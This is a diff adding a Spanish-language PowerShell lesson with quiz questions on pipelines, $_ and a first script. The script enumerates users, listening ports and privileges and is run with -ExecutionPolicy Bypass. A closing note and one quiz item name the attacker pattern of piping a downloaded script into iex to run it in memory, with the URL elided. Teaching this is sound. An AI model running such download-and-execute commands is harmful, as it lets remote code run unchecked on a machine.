@@ -1,0 +1,62 @@
+---
+index: 3
+title: "Pipelines, variables y tu primer script PS"
+questions:
+  - id: linea-de-comandos-windows-t03-q01
+    prompt: "¿Qué variable automática de PowerShell representa el objeto actual del pipeline?"
+    hint: "El dólar con guion bajo."
+    kind: text
+  - id: linea-de-comandos-windows-t03-q02
+    prompt: "¿Qué cmdlet descarga y ejecuta contenido de una URL (el que NUNCA ejecutes de fuentes que no controles)?"
+    hint: " Invoke-Expression abreviado, iex."
+    kind: text
+  - id: linea-de-comandos-windows-t03-q03
+    prompt: "¿Qué hace 'Get-ChildItem -Recurse -Filter *.zip | Select-Object FullName'?"
+    hint: "Tres cmdlets, un pipeline."
+    kind: choice
+    options:
+      - id: a
+        label: "Comprime todas las carpetas"
+      - id: b
+        label: "Busca todos los .zip recursivamente y muestra su ruta completa"
+      - id: c
+        label: "Borra los zip tras listarlos"
+      - id: d
+        label: "Abre los zip en el explorador"
+---
+
+## El pipeline de objetos
+
+```powershell
+Get-ChildItem -Recurse -Filter *.log |
+  Where-Object Length -gt 1MB |
+  Sort-Object Length -Descending |
+  Select-Object Name, Length, FullName |
+  Export-Csv grandes.csv -NoTypeInformation
+```
+
+Cada cmdlet pasa objetos completos al siguiente. `$_` es el objeto actual:
+
+```powershell
+Get-Service | Where-Object { $_.Status -eq 'Stopped' -and $_.Name -like '*sql*' }
+```
+
+## Tu primer script
+
+```powershell
+# enumerar.ps1 — primera ronda sobre una máquina Windows
+Write-Host "== Sistema ==";      Get-ComputerInfo | Select-Object WindowsProductName, OsVersion
+Write-Host "== Usuarios ==";     Get-LocalUser
+Write-Host "== Puertos ==";      Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess
+Write-Host "== Privilegios ==";  whoami /priv
+```
+
+```powershell
+powershell -ExecutionPolicy Bypass -File .\enumerar.ps1
+```
+
+Eso es exactamente tu `enumerar.sh` de Linux, en Windows. Misma metodología, otro
+idioma — ya puedes operar en ambos sistemas del path. Nota final: atacantes usan
+`iex (New-Object Net.WebClient).DownloadString('http://.../script.ps1')` (o su
+abreviatura con `iwr ... | iex`) para cargar herramientas en memoria; verás ese
+patrón en cada walk-through de herramientas ofensivas.
